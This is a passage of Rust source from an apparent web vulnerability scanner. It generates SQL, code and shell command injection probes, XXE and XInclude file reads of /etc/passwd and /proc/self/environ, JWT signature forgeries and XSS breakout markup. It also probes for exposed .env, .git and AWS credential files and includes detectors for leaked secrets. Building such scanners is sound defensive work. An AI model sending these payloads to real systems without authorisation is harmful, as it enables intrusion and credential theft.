            ("code-injection",format!("${{'fer'+'rite{marker}'}}"),Matcher::Contains{value:format!("ferrite{marker}"),absent:String::new()}),
            ("code-injection",format!("#{{'fer'+'rite{marker}'}}"),Matcher::Contains{value:format!("ferrite{marker}"),absent:String::new()}),
            ("code-injection",format!("';Response.Write(\"fer\"&\"rite{marker}\")'"),Matcher::Contains{value:format!("ferrite{marker}"),absent:String::new()}),
            ("code-injection",format!("';print 'fer'.'rite{marker}';#"),Matcher::Contains{value:format!("ferrite{marker}"),absent:String::new()}),
            ("code-injection",format!("';puts 'fer'+'rite{marker}';#"),Matcher::Contains{value:format!("ferrite{marker}"),absent:String::new()}),
        ]{at(id,&payload,matcher)?;}
        for (family, template) in [
            ("code-php-time", "';sleep({seconds});$f='"),
            ("code-python-time", "';import time;time.sleep({seconds});#'"),
            ("code-ruby-time", "';sleep {seconds};#'"),
            ("code-perl-time", "';sleep {seconds};#'"),
        ] {
            for pair in 0..2 {
                for positive in [false, true] {
                    let seconds = if positive { 2 } else { 0 };
                    let payload = template.replace("{seconds}", &seconds.to_string());
                    at(
                        "code-injection",
                        &payload,
                        Matcher::Series {
                            family: family.into(),
                            pair,
                            positive,
                            payload: payload.clone(),
                        },
                    )?;
                }
            }
        }
        for context in sql_contexts(&point.original) {
            for or in [false, true] {
                if or && context.terminated_prefix(&point.original).is_none() {
                    continue;
                }
                for pair in 0..2 {
                    for positive in [false, true] {
                        // Positive means the branch expected to preserve the selected result.
                        // OR-false controls retain empty baselines; AND-true retains matching rows.
                        let equal = positive != or;
                        let predicate = format!(
                            "{}={}",
                            719 + pair,
                            if equal { 719 + pair } else { 720 + pair }
                        );
                        let payload = context.predicate(&point.original, &predicate, &marker, or);
                        at(
                            "sqli-boolean",
                            &payload,
                            Matcher::Series {
                                family: format!(
                                    "sql-bool-{}-{}",
                                    context.label(),
                                    if or { "or" } else { "and" }
                                ),
                                pair,
                                positive,
                                payload: payload.clone(),
                            },
                        )?;
                    }
                }
            }
            for dialect in ["mysql", "pg", "mssql", "oracle"] {
                // Double quotes denote strings only in MySQL's non-ANSI mode. WAITFOR
                // is a T-SQL statement, never a scalar expression or CASE branch.
                if context.double_quoted() && dialect != "mysql" {
                    continue;
                }
                if dialect == "mssql" && context.terminated_prefix(&point.original).is_none() {
                    continue;
                }
                for pair in 0..2 {
                    for positive in [false, true] {
                        let seconds = if positive { 2 } else { 0 };
                        let payload = if dialect == "mssql" {
                            format!(
                                "{};WAITFOR DELAY '0:0:{seconds}'-- ",
                                context.terminated_prefix(&point.original).unwrap()
                            )
                        } else {
                            let predicate = match dialect {
                                // SLEEP returns zero on normal completion, so both branches
                                // remain true instead of replacing the matching predicate with false.
                                "mysql" => format!("SLEEP({seconds})=0"),
                                "pg" => format!("(SELECT 1 FROM pg_sleep({seconds}))=1"),
                                // RECEIVE_MESSAGE returns one when its unique pipe times out,
                                // including the zero-second control.
                                _ => format!(
                                    "DBMS_PIPE.RECEIVE_MESSAGE('fer{marker}_{pair}',{seconds})=1"
                                ),
                            };
                            context.predicate(&point.original, &predicate, &marker, false)
                        };
                        at(
                            "sqli-time",
                            &payload,
                            Matcher::Series {
                                family: format!("sql-{dialect}-{}-time", context.label()),
                                pair,
                                positive,
                                payload: payload.clone(),
                            },
                        )?;
                    }
                }
            }
        }
        for (family, template) in [
            ("command-time", ";sleep {seconds};"),
            ("command-pipe-time", "|sleep {seconds}"),
            ("command-subshell-time", "$(sleep {seconds})"),
            ("command-windows-time", "& ping -n {count} 127.0.0.1 >nul &"),
            (
                "command-windows-timeout-time",
                "& timeout /T {count} >nul &",
            ),
        ] {
            for pair in 0..2 {
                for positive in [false, true] {
                    let seconds = if positive { 2 } else { 0 };
                    let payload = template
                        .replace("{seconds}", &seconds.to_string())
                        .replace("{count}", &(seconds + 1).to_string());
                    at(
                        "command-time",
                        &payload,
                        Matcher::Series {
                            family: family.into(),
                            pair,
                            positive,
                            payload: payload.clone(),
                        },
                    )?;
                }
            }
        }
    }
    let mut add = |id: &str, point: &str, request: Vec<u8>, matcher: Matcher| {
        admit(
            settings,
            base,
            &mut probes,
            &mut single_requests,
            &mut plan_bytes,
            &mut skipped,
            settings.max_probes_per_request,
            id,
            point,
            request,
            matcher,
        );
    };
    let mut cors = request.clone();
    let origin = format!("https://{marker}.invalid");
    cors.set("Origin", origin.clone());
    add(
        "cors-origin",
        "Origin header",
        cors.encode(),
        Matcher::Cors(origin),
    );
    let mut trace = request.clone();
    let target = origin_target(&trace, &base.destination)?;
    trace.start = format!("TRACE {target} HTTP/1.1");
    trace.body.clear();
    trace.set("X-Ferrite-Probe", marker.clone());
    trace.normalize_length();
    add(
        "trace",
        "HTTP method",
        trace.encode(),
        Matcher::Trace(marker.clone()),
    );
    let url = url::Url::parse(&base.url)?;
    let path = url.path();
    let directory = path.rsplit_once('/').map_or("/", |(p, _)| p);
    let directory = if directory.is_empty() {
        "/".into()
    } else {
        format!("{directory}/")
    };
    for (id, path, kind) in [
        ("env-file", "/.env".into(), FileKind::Env),
        ("env-file", "/.env.local".into(), FileKind::Env),
        ("env-file", "/.env.production".into(), FileKind::Env),
        ("env-file", "/.env.backup".into(), FileKind::Env),
        ("env-file", format!("{directory}.env"), FileKind::Env),
        ("git-config", "/.git/config".into(), FileKind::Git),
        ("git-config", "/.git/HEAD".into(), FileKind::GitHead),
        (
            "git-config",
            format!("{directory}.git/config"),
            FileKind::Git,
        ),
        ("robots", "/robots.txt".into(), FileKind::Robots),
        ("openapi", "/openapi.json".into(), FileKind::Openapi),
        ("openapi", "/swagger.json".into(), FileKind::Openapi),
        ("openapi", "/openapi.yaml".into(), FileKind::Openapi),
        ("openapi", "/swagger.yaml".into(), FileKind::Openapi),
        ("openapi", "/api-docs".into(), FileKind::Openapi),
        ("openapi", "/v3/api-docs".into(), FileKind::Openapi),
        (
            "openapi",
            "/.well-known/openapi.json".into(),
            FileKind::Openapi,
        ),
        (
            "openapi",
            "/swagger/v1/swagger.json".into(),
            FileKind::Openapi,
        ),
        ("env-file", "/actuator/env".into(), FileKind::Actuator),
        ("aws-credentials", "/.aws/credentials".into(), FileKind::Aws),
        ("ds-store", "/.DS_Store".into(), FileKind::DsStore),
        (
            "server-status",
            "/server-status".into(),
            FileKind::ServerStatus,
        ),
        ("elmah", "/elmah.axd".into(), FileKind::Elmah),
        ("svn-metadata", "/.svn/entries".into(), FileKind::Svn),
        ("jwks", "/.well-known/jwks.json".into(), FileKind::Jwks),
        ("jwks", "/.well-known/jwks".into(), FileKind::Jwks),
        ("backup-file", format!("{path}.bak"), FileKind::Backup),
        ("backup-file", format!("{path}.old"), FileKind::Backup),
        ("backup-file", format!("{path}.orig"), FileKind::Backup),
        ("backup-file", format!("{path}.save"), FileKind::Backup),
        ("backup-file", format!("{path}.swp"), FileKind::Backup),
        (
            "backup-file",
            format!("{directory}{}~", path.rsplit('/').next().unwrap_or("index")),
            FileKind::Backup,
        ),
        (
            "asp-trace",
            format!("{directory}trace.axd"),
            FileKind::AspTrace,
        ),
        (
            "asp-trace",
            format!("{directory}Trace.axd"),
            FileKind::AspTrace,
        ),
        (
            "phpinfo",
            format!("{directory}phpinfo.php"),
            FileKind::PhpInfo,
        ),
        ("phpinfo", format!("{directory}info.php"), FileKind::PhpInfo),
        ("phpinfo", format!("{directory}phpinfo"), FileKind::PhpInfo),
        (
            "web-config",
            format!("{directory}web.config"),
            FileKind::WebConfig,
        ),
        (
            "web-config",
            format!("{directory}Web.config"),
            FileKind::WebConfig,
        ),
    ] {
        let mut probe = request.clone();
        probe.start = format!("GET {path} HTTP/1.1");
        probe.body.clear();
        probe.normalize_length();
        add(id, "resource path", probe.encode(), Matcher::File(kind));
    }
    if is_json(&request) || path.to_ascii_lowercase().contains("graphql") {
        let mut graphql = request.clone();
        graphql.start = format!(
            "POST {} HTTP/1.1",
            origin_target(&request, &base.destination)?
        );
        graphql.set("Content-Type", "application/json".into());
        graphql.body=br#"{"query":"query FerriteIntrospection { __schema { queryType { name } types { name kind } } }"}"#.to_vec();
        graphql.normalize_length();
        add(
            "graphql-introspection",
            "GraphQL query",
            graphql.encode(),
            Matcher::Graphql,
        );
    }
    if request
        .header("Content-Type")
        .is_some_and(|v| v.to_ascii_lowercase().contains("xml"))
        && let Ok(body) = std::str::from_utf8(&request.body)
        && !body.to_ascii_uppercase().contains("<!DOCTYPE")
    {
        let root = Regex::new(r"<([A-Za-z_][A-Za-z0-9_.:-]*)[\s>]")?
            .captures(body)
            .and_then(|c| c.get(1).map(|m| m.as_str().to_owned()));
        if let Some(root) = root {
            let leaves = Regex::new(r">[^<>]*</")?;
            for (id, entity, matcher) in [
                (
                    "xml-entity",
                    format!("f&#101;r{marker}"),
                    Matcher::Entity(format!("fer{marker}")),
                ),
                (
                    "xxe-file",
                    "SYSTEM \"file:///etc/passwd\"".into(),
                    Matcher::Contains {
                        value: "file:passwd".into(),
                        absent: String::new(),
                    },
                ),
                (
                    "xxe-file",
                    "SYSTEM \"file:///etc/hosts\"".into(),
                    Matcher::Contains {
                        value: "file:hosts".into(),
                        absent: String::new(),
                    },
                ),
                (
                    "xxe-file",
                    "SYSTEM \"file:///proc/self/environ\"".into(),
                    Matcher::Contains {
                        value: "file:environ".into(),
                        absent: String::new(),
                    },
                ),
                (
                    "xxe-file",
                    "SYSTEM \"file:///C:/windows/win.ini\"".into(),
                    Matcher::Contains {
                        value: "file:winini".into(),
                        absent: String::new(),
                    },
                ),
            ] {
                let declaration = if id == "xml-entity" {
                    format!("<!DOCTYPE {root} [<!ENTITY ferrite \"{entity}\">]>")
                } else {
                    format!("<!DOCTYPE {root} [<!ENTITY ferrite {entity}>]>")
                };
                let trimmed = body.trim_start();
                let prefix = if trimmed.starts_with("<?xml") {
                    body.find("?>").map(|n| n + 2).unwrap_or(0)
                } else {
                    0
                };
                let mut xml = request.clone();
                if let Some(leaf) = leaves.find(&body[prefix..]) {
                    let start = prefix + leaf.start() + 1;
                    let end = prefix + leaf.end() - 2;
                    let mut changed = body.to_owned();
                    changed.replace_range(start..end, "&ferrite;");
                    changed.insert_str(prefix, &declaration);
                    xml.body = changed.into_bytes();
                    xml.normalize_length();
                    add(id, "XML document", xml.encode(), matcher);
                }
            }
            // XInclude resolves an element's href at parse time. A file target
            // that returns recognizable file content is direct evidence.
            if let Some(index) = body.rfind(&format!("</{root}>")) {
                for (target, value) in [
                    ("file:///etc/passwd", "file:passwd"),
                    ("file:///etc/hosts", "file:hosts"),
                ] {
                    let mut xml = request.clone();
                    let mut changed = body.to_owned();
                    changed.insert_str(
                        index,
                        &format!(
                            "<xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" href=\"{target}\" parse=\"text\"/>"
                        ),
                    );
                    xml.body = changed.into_bytes();
                    xml.normalize_length();
                    add(
                        "xinclude",
                        "XML document",
                        xml.encode(),
                        Matcher::Contains {
                            value: value.into(),
                            absent: String::new(),
                        },
                    );
                }
            }
        }
    }
    for token in jwt_tokens(&request) {
        let p: Vec<_> = token.split('.').collect();
        let mut header = URL_SAFE_NO_PAD
            .decode(p[0])
            .ok()
            .and_then(|bytes| serde_json::from_slice::<serde_json::Value>(&bytes).ok())
            .unwrap_or_else(|| serde_json::json!({"typ": "JWT"}));
        header["alg"] = serde_json::json!("none");
        let unsigned = format!(
            "{}.{}.",
            URL_SAFE_NO_PAD.encode(serde_json::to_vec(&header)?),
            p[1]
        );
        let invalid = format!(
            "{}.{}.{}",
            p[0],
            p[1],
            URL_SAFE_NO_PAD.encode(format!("invalid{marker}"))
        );
        for (positive, replacement) in [(false, invalid), (true, unsigned)] {
            add(
                "jwt-none",
                "JWT signature",
                replace_token(&request, &token, &replacement).encode(),
                Matcher::Series {
                    family: "jwt-none".into(),
                    pair: 0,
                    positive,
                    payload: replacement,
                },
            );
        }
        for (positive, replacement) in [
            (false, format!("ferrite-malformed-{marker}")),
            (
                true,
                format!(
                    "{}.{}.{}",
                    p[0],
                    p[1],
                    URL_SAFE_NO_PAD.encode(format!("corrupted-{marker}"))
                ),
            ),
        ] {
            add(
                "jwt-signature",
                "JWT signature",
                replace_token(&request, &token, &replacement).encode(),
                Matcher::Series {
                    family: "jwt-signature".into(),
                    pair: 0,
                    positive,
                    payload: replacement,
                },
            );
        }
        let signing_key = SigningKey::random(&mut OsRng);
        let point = signing_key.verifying_key().to_encoded_point(false);
        let x = URL_SAFE_NO_PAD.encode(point.x().map(|v| v.as_slice()).unwrap_or_default());
        let y = URL_SAFE_NO_PAD.encode(point.y().map(|v| v.as_slice()).unwrap_or_default());
        let header = serde_json::json!({
            "alg": "ES256",
            "typ": "JWT",
            "jwk": {"kty": "EC", "crv": "P-256", "x": x, "y": y}
        });
        let header = URL_SAFE_NO_PAD.encode(serde_json::to_vec(&header)?);
        let signing_input = format!("{header}.{}", p[1]);
        let signature: Signature = signing_key.sign(signing_input.as_bytes());
        let valid = format!(
            "{signing_input}.{}",
            URL_SAFE_NO_PAD.encode(signature.to_bytes().as_slice())
        );
        let mut corrupted = signature.to_bytes();
        corrupted[0] ^= 1;
        let invalid = format!(
            "{signing_input}.{}",
            URL_SAFE_NO_PAD.encode(corrupted.as_slice())
        );
        for (positive, replacement) in [(false, invalid), (true, valid)] {
            add(
                "jwt-jwk",
                "JWT signature",
                replace_token(&request, &token, &replacement).encode(),
                Matcher::Series {
                    family: "jwt-jwk".into(),
                    pair: 0,
                    positive,
                    payload: replacement,
                },
            );
        }
    }
    for group in stylesheet::plan(base, &request, settings).as_chunks::<3>().0 {
        let group_bytes: usize = group.iter().map(|probe| probe.request.len()).sum();
        if probes.len() + group.len() > settings.max_probes_per_request
            || group_bytes > (64 * 1024 * 1024usize).saturating_sub(plan_bytes)
        {
            skipped += group.len();
            continue;
        }
        plan_bytes += group_bytes;
        probes.extend_from_slice(group);
    }
    for probe in advanced::active_plan(base, settings)? {
        if probes.len() >= settings.max_probes_per_request
            || probe.request.len()
                > 64usize
                    .saturating_mul(1024 * 1024)
                    .saturating_sub(plan_bytes)
        {
            skipped += 1;
            continue;
        }
        plan_bytes += probe.request.len();
        probes.push(probe);
    }
    for probe in point_probes.drain(..) {
        if probes.len() >= settings.max_probes_per_request
            || probe.request.len()
                > 64usize
                    .saturating_mul(1024 * 1024)
                    .saturating_sub(plan_bytes)
        {
            skipped += 1;
            continue;
        }
        plan_bytes += probe.request.len();
        probes.push(probe);
    }
    skipped += point_skipped;
    // Cheap, request-level probes run first. Serial timing and state-changing
    // probes run last so progress stays useful and cancellation stays cheap.
    probes.sort_by_key(|probe| probe.serial());
    Ok(Plan { probes, skipped })
}

/// Baseline state shared by every probe evaluated against one request. The
/// decoded body and parsed message are produced once instead of once per probe,
/// which keeps both latency and transient allocation bounded on large scans.
pub struct CachedBaseline<'a> {
    pub(crate) exchange: &'a Exchange,
    pub(crate) message: Option<Message>,
    pub(crate) body: String,
}

impl<'a> CachedBaseline<'a> {
    pub fn new(exchange: &'a Exchange) -> Self {
        let message = if exchange.error.is_none() {
            Message::parse(&exchange.response)
                .ok()
                .filter(|message| message.status() == exchange.status)
        } else {
            None
        };
        let body = message
            .as_ref()
            .and_then(|message| text_body(message, 4 * 1024 * 1024))
            .unwrap_or_default();
        Self {
            exchange,
            message,
            body,
        }
    }
}

pub fn evaluate(probe: &Probe, baseline: &Exchange, response: &Exchange) -> Vec<Candidate> {
    evaluate_cached(&CachedBaseline::new(baseline), probe, response)
}

pub fn evaluate_cached(
    baseline: &CachedBaseline<'_>,
    probe: &Probe,
    response: &Exchange,
) -> Vec<Candidate> {
    if let Matcher::ReflectedInput(token) = &probe.matcher {
        return reflection::evaluate_cached(probe, baseline, response, token);
    }
    let Some(before) = baseline.message.as_ref() else {
        return vec![];
    };
    if matches!(&probe.matcher, Matcher::Stored(_)) {
        return vec![];
    }
    if matches!(&probe.matcher, Matcher::Advanced(_)) {
        return advanced::evaluate_cached(probe, baseline, response);
    }
    if response.error.is_some() || response.response.is_empty() {
        return vec![];
    }
    let Ok(message) = Message::parse(&response.response) else {
        return vec![];
    };
    let body = text_body(&message, 4 * 1024 * 1024).unwrap_or_default();
    let old = baseline.body.as_str();
    let detected = match &probe.matcher {
        Matcher::SqlError => sql_error(&body) && !sql_error(old),
        Matcher::Entity(marker) => {
            body.contains(marker)
                && !old.contains(marker)
                && !re(r"(?i)(?:<!|&lt;!|&#0*60;!|&#x0*3c;!)DOCTYPE", &body)
                && !body.contains("&ferrite;")
                && !body.contains("&amp;ferrite;")
        }
        Matcher::Xss { token, payload } => {
            xss_html_response(&message)
                && body.contains(token)
                && !old.contains(token)
                && xss_execution_context(&body, payload)
        }
        Matcher::Header(marker) => message
            .headers
            .iter()
            .any(|(k, v)| k.eq_ignore_ascii_case(&format!("X-Ferrite-{marker}")) && v == marker),
        Matcher::Redirect(host) => {
            (200..400).contains(&message.status())
                && redirect_target(&message, &body, &response.url)
                    .is_some_and(|u| u.host_str() == Some(host))
                && redirect_target(before, old, &baseline.exchange.url)
                    .is_none_or(|u| u.host_str() != Some(host))
        }
        Matcher::Cors(origin) => {
            message.header("Access-Control-Allow-Origin") == Some(origin)
                && message
                    .header("Access-Control-Allow-Credentials")
                    .is_some_and(|v| v.eq_ignore_ascii_case("true"))
                && baseline.exchange.destination.tls
                && (200..300).contains(&baseline.exchange.status)
                && similar_content(before, &message)
                && !old.is_empty()
                && (Message::parse(&baseline.exchange.request).is_ok_and(|r| {
                    r.header("Authorization").is_some() || r.header("Cookie").is_some()
                }))
        }
        Matcher::Contains { value, absent } => {
            let present = |text: &str| match value.as_str() {
                "file:passwd" => passwd(text),
                "file:hosts" => hosts_file(text),
                "file:winini" => win_ini(text),
                "file:bootini" => boot_ini(text),
                "file:environ" => environ_file(text),
                "metadata:credentials" => metadata_credentials(text),
                "cloud:token" => cloud_token(text),
                _ => text.contains(value),
            };
            let signature = value.starts_with("file:")
                || matches!(value.as_str(), "metadata:credentials" | "cloud:token");
            present(&body)
                && !present(old)
                && (signature || absent.is_empty() || !body.contains(absent))
        }
        Matcher::File(kind) => {
            message.status() == 200
                && message.body != before.body
                && match kind {
                    FileKind::Env => {
                        re(
                            r"(?m)^\s*(?:APP_ENV|APP_DEBUG|DB_HOST|DB_USER|DB_NAME|MAIL_HOST|SMTP_HOST|[A-Z][A-Z0-9_]*(?:PASSWORD|SECRET|TOKEN|KEY|DATABASE_URL|DSN|CONNECTION)[A-Z0-9_]*)\s*=\s*[^\r\n]+$",
                            &body,
                        ) && !body.to_ascii_lowercase().contains("<html")
                    }
                    FileKind::Git => {
                        body.contains("[core]")
                            && re(r"(?m)^\s*(?:repositoryformatversion|bare)\s*=", &body)
                    }
                    FileKind::GitHead => re(r"(?im)^(?:ref:\s+refs/|[0-9a-f]{40}\s*$)", &body),
                    FileKind::Backup => {
                        (source_code(&body)
                            || re(
                                r"(?ims)<configuration[\s>]|^\s*\[(?:core|database|mysqli|server)\]",
                                &body,
                            ))
                            && !source_code(old)
                    }
                    FileKind::Robots => re(r"(?im)^\s*User-agent\s*:", &body),
                    FileKind::Openapi => openapi(&body),
                    FileKind::Jwks => jwks(&body).is_some(),
                    FileKind::AspTrace => diagnostic_pages(&body)
                        .iter()
                        .any(|(id, _)| *id == "asp-trace"),
                    FileKind::PhpInfo => diagnostic_pages(&body)
                        .iter()
                        .any(|(id, _)| *id == "phpinfo"),
                    FileKind::WebConfig => diagnostic_pages(&body)
                        .iter()
                        .any(|(id, _)| *id == "web-config"),
                    FileKind::Actuator => {
                        serde_json::from_str::<serde_json::Value>(&body)
                            .ok()
                            .is_some_and(|v| {
                                v.get("propertySources").is_some()
                                    || v.get("activeProfiles").is_some()
                            })
                            && !body.to_ascii_lowercase().contains("<html")
                    }
                    FileKind::Aws => {
                        re(r"(?im)^\s*\[[^\]]+\]\s*$", &body)
                            && re(
                                r"(?im)^\s*aws_(?:access_key_id|secret_access_key|session_token)\s*=",
                                &body,
                            )
                    }
                    FileKind::DsStore => {
                        message.body.starts_with(&[0, 0, 0, 1])
                            && message.body.windows(4).any(|window| window == b"Bud1")
                    }
                    FileKind::ServerStatus => {
                        re(r"(?i)<title>\s*Apache (?:Server )?Status", &body)
                            || (body.contains("Server Version:")
                                && body.contains("Apache Server Status"))
                    }
                    FileKind::Elmah => {
                        re(r"(?i)<title>[^<]*Error Log for", &body)
                            || body.contains("Powered by <a href=\"http://code.google.com/p/elmah/")
                    }
                    FileKind::Svn => {
                        re(r"(?m)^\d+\s*$", &body) && re(r"(?m)^(?:dir|file)\s*$", &body)
                    }
                }
        }
        Matcher::Graphql => serde_json::from_str::<serde_json::Value>(&body)
            .ok()
            .is_some_and(|v| {
                v.pointer("/data/__schema/types")
                    .is_some_and(|t| t.is_array())
                    && v.pointer("/data/__schema/queryType/name")
                        .is_some_and(|t| t.is_string())
            }),
        Matcher::Trace(marker) => {
            message
                .header("Content-Type")
                .is_some_and(|v| v.to_ascii_lowercase().starts_with("message/http"))
                && body.contains(&format!("X-Ferrite-Probe: {marker}"))
                && body.starts_with("TRACE ")
        }
        Matcher::Series { .. }
        | Matcher::Advanced(_)
        | Matcher::Stored(_)
        | Matcher::ReflectedInput(_)
        | Matcher::Stylesheet(_) => false,
    };
    if !detected {
        return vec![];
    }
    let mut finding = candidate(
        &probe.issue_id,
        response,
        Confidence::Firm,
        &probe.insertion_point,
        format!(
            "The {} probe produced its check-specific evidence, absent from the selected baseline. Review the attached control and probe exchanges.",
            probe.issue_id
        ),
    );
    if matches!(&probe.matcher, Matcher::Xss { .. }) {
        finding.detail = "The exact injected executable HTML markup was returned in a token context outside quoted attributes, comments, raw text, and inert containers. Browser execution, CSP bypass, and practical exploitability require manual verification.".into();
    }
    finding.evidence.insert(
        0,
        Evidence {
            label: "Selected baseline".into(),
            exchange: baseline.exchange.clone(),
        },
    );
    vec![finding]
}
fn redirect_target(message: &Message, body: &str, base: &str) -> Option<url::Url> {
    static META_REFRESH: [LazyLock<Regex>; 2] = [
        LazyLock::new(|| {
            Regex::new(
                r#"(?is)<meta[^>]*http-equiv\s*=\s*["']?refresh["']?[^>]*content\s*=\s*["'][^"']*?url\s*=\s*([^"'>\s]+)"#,
            )
            .unwrap()
        }),
        LazyLock::new(|| {
            Regex::new(
                r#"(?is)<meta[^>]*content\s*=\s*["'][^"']*?url\s*=\s*([^"'>\s]+)[^>]*http-equiv\s*=\s*["']?refresh["']?"#,
            )
            .unwrap()
        }),
    ];
    let base = url::Url::parse(base).ok()?;
    if let Some(location) = message.header("Location")
        && let Some(url) = url::Url::parse(location)
            .ok()
            .or_else(|| base.join(location).ok())
    {
        return Some(url);
    }
    if let Some(refresh) = message.header("Refresh")
        && let Some(index) = refresh.to_ascii_lowercase().find("url=")
        && let Some(url) = url::Url::parse(refresh[index + 4..].trim())
            .ok()
            .or_else(|| base.join(refresh[index + 4..].trim()).ok())
    {
        return Some(url);
    }
    for pattern in &META_REFRESH {
        if let Some(value) = pattern
            .captures(body)
            .and_then(|captures| captures.get(1).map(|m| m.as_str()))
            && let Some(url) = base.join(value).ok()
        {
            return Some(url);
        }
    }
    None
}
fn same_content(a: &Message, b: &Message) -> bool {
    a.status() == b.status()
        && bounded_body(a, 4 * 1024 * 1024)
            .zip(bounded_body(b, 4 * 1024 * 1024))
            .is_some_and(|(a, b)| !a.is_empty() && a == b)
}
/// Response comparison for checks where the application may legitimately emit
/// per-request values. Exact content still wins; otherwise the status and a
/// bounded length must match and volatile tokens are normalized before the
/// comparison. This is deliberately not used for SQL boolean evidence, where a
/// changed row must remain a changed row.
fn similar_content(a: &Message, b: &Message) -> bool {
    if same_content(a, b) {
        return true;
    }
    if a.status() != b.status() {
        return false;
    }
    let (Some(left), Some(right)) = (
        bounded_body(a, 4 * 1024 * 1024),
        bounded_body(b, 4 * 1024 * 1024),
    ) else {
        return false;
    };
    if left.is_empty() || right.is_empty() {
        return false;
    }
    let longest = left.len().max(right.len());
    let difference = left.len().abs_diff(right.len());
    if difference.saturating_mul(20) > longest {
        return false;
    }
    let normalize = |bytes: &[u8]| {
        static VOLATILE: LazyLock<Regex> = LazyLock::new(|| {
            Regex::new(
                r"(?i)\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b|\b[0-9a-f]{16,}\b|\b\d{10,}\b",
            )
            .unwrap()
        });
        let text = String::from_utf8_lossy(bytes);
        VOLATILE.replace_all(&text, "#").into_owned()
    };
    normalize(&left) == normalize(&right)
}
fn metadata_credentials(body: &str) -> bool {
    serde_json::from_str::<serde_json::Value>(body)
        .ok()
        .is_some_and(|v| {
            v.get("AccessKeyId")
                .and_then(|v| v.as_str())
                .is_some_and(|s| re(r"^(?:AKIA|ASIA)[A-Z0-9]{16}$", s))
                && v.get("SecretAccessKey")
                    .and_then(|v| v.as_str())
                    .is_some_and(|s| s.len() >= 32)
                && v.get("Token")
                    .and_then(|v| v.as_str())
                    .is_some_and(|s| s.len() >= 16)
        })
}
fn xss_markup(payload: &str) -> &str {
    ["<svg", "<img", "<details"]
        .iter()
        .find_map(|tag| payload.find(tag).map(|index| &payload[index..]))
        .unwrap_or(payload)
}
type XssVariant = (&'static str, fn(&str) -> String);
/// Break out of one known HTML tokenizer context at a time. Each family has a
/// distinct token so evidence from one request cannot satisfy another family.
/// Several executable markup variants are sent per context so a target that
/// filters one event handler or tag name does not hide the reflection.
fn xss_payloads(seed: &str) -> Vec<(String, String)> {
    [
        ("double", "\">"),
        ("single", "'>"),
        ("unquoted", ">"),
        ("html", ""),
        ("script", "</script>"),
        ("textarea", "</textarea>"),
        ("title", "</title>"),
        ("comment", "-->"),
        ("style", "</style>"),
        ("xmp", "</xmp>"),
        ("iframe", "</iframe>"),
        ("noembed", "</noembed>"),
        ("noframes", "</noframes>"),
        ("template", "</template>"),
        ("select", "</select>"),
        ("svg", "</svg>"),
        ("math", "</math>"),
        ("noscript", "</noscript>"),
    ]
    .into_iter()
    .flat_map(|(context, breakout)| {
        let variants: [XssVariant; 3] = [
            ("svg", |token| format!("<svg onload=alert('{token}')>")),
            ("img", |token| {
                format!("<img src=x onerror=alert('{token}')>")
            }),
            ("details", |token| {
                format!("<details open ontoggle=alert('{token}')>")
            }),
        ];
        variants.into_iter().map(move |(variant, markup)| {
            let token = format!("{seed}-{context}-{variant}");
            (token.clone(), format!("{breakout}{}", markup(&token)))
        })
    })
    .collect()
}

fn xss_html_response(message: &Message) -> bool {
    message.header("Content-Type").is_some_and(|value| {
        value
            .split(';')
            .next()
            .is_some_and(|mime| mime.trim().eq_ignore_ascii_case("text/html"))
    }) && !message.headers.iter().any(|(name, value)| {
        name.eq_ignore_ascii_case("Content-Disposition")
            && value
                .split(';')
                .next()
                .is_some_and(|disposition| disposition.trim().eq_ignore_ascii_case("attachment"))
    })
}

fn html_tag_boundary(byte: u8) -> bool {
    byte.is_ascii_whitespace() || matches!(byte, b'>' | b'/')
}

fn html_tag_end(bytes: &[u8], mut cursor: usize, limit: usize) -> Option<usize> {
    let mut quote = None;
    while cursor < limit {
        let byte = bytes[cursor];
        if let Some(delimiter) = quote {
            if byte == delimiter {
                quote = None;
            }
        } else if matches!(byte, b'\'' | b'"') {
            quote = Some(byte);
        } else if byte == b'>' {
            return Some(cursor + 1);
        }
        cursor += 1;
    }
    None
}

/// Determine whether the exact injected SVG start tag is an HTML token rather
/// than text inside an attribute, comment, raw-text element, or inert subtree.
/// This is a bounded lexical check, not browser execution or a full DOM parser.
/// Tokenizer contexts follow https://html.spec.whatwg.org/multipage/parsing.html.
/// Determine whether the injected markup occurs at least once as an executable
/// HTML token. Every occurrence is considered: pages that echo input into
/// `<title>` and then into the body must still report the body occurrence.
fn html_execution_context(body: &str, marker: &str) -> bool {
    if marker.is_empty() {
        return false;
    }
    let lower = body.to_ascii_lowercase();
    let bytes = lower.as_bytes();
    let mut searched = 0usize;
    let mut checked = 0usize;
    while let Some(offset) = body[searched..].find(marker) {
        let limit = searched + offset;
        if executable_prefix(&lower, bytes, limit) {
            return true;
        }
        checked += 1;
        if checked >= 8 {
            break;
        }
        searched = limit + marker.len();
        if searched >= body.len() {
            break;
        }
    }
    false
}

/// Bounded lexical check for the tokenizer state at `limit`. This is not
/// browser execution or a full DOM parser. Tokenizer contexts follow
/// https://html.spec.whatwg.org/multipage/parsing.html.
fn executable_prefix(lower: &str, bytes: &[u8], limit: usize) -> bool {
    let mut cursor = 0;
    let mut raw: Option<&str> = None;
    let mut script_escaped = false;
    let mut script_double_escaped = false;
    let mut templates = 0usize;
    let mut select = false;
    let mut math = 0usize;
    let mut frameset = false;
    while cursor < limit {
        let tail = &bytes[cursor..limit];
        if let Some(tag) = raw {
            if tag == "plaintext" {
                return false;
            }
            if tag == "script" {
                if tail.starts_with(b"<!--") {
                    script_escaped = true;
                    cursor += 4;
                    continue;
                }
                if tail.starts_with(b"-->") {
                    script_escaped = false;
                    script_double_escaped = false;
                    cursor += 3;
                    continue;
                }
                if script_escaped
                    && tail.starts_with(b"<script")
                    && tail.get(7).is_some_and(|byte| html_tag_boundary(*byte))
                {
                    script_double_escaped = true;
                    cursor += 7;
                    continue;
                }
            }
            let close_name = cursor + 2;
            let name_end = close_name + tag.len();
            if tail.starts_with(b"</")
                && bytes.get(close_name..name_end) == Some(tag.as_bytes())
                && name_end < limit
                && html_tag_boundary(bytes[name_end])
            {
                if tag == "script" && script_double_escaped {
                    script_double_escaped = false;
                    cursor = name_end;
                    continue;
                }
                let Some(end) = html_tag_end(bytes, name_end, limit) else {
                    return false;
                };
                cursor = end;
                raw = None;
                script_escaped = false;
                continue;
            }
            cursor += 1;
            continue;
        }
        if tail.starts_with(b"<!--") {
            let Some(end) = bytes[cursor + 4..limit]
                .windows(3)
                .position(|window| window == b"-->")
            else {
                return false;
            };
